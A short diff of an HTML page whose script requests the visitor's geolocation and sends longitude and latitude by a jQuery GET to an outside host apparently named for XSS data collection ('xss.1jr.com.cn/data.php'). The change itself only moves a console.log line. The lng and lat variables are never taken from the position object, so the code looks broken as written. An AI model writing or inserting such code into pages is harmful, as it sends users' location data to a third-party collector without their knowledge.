@@ -12,7 +12,6 @@
 <script type="text/javascript">
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
-        console.log($);
         $.get("https://xss.1jr.com.cn/data.php",{ getLng: lng, getLat: lat},function(result){
         alert('end');
         });
@@ -21,5 +20,6 @@
         console.log(err)
     });
 </script>
+     console.log($);
 </body>
 </html>
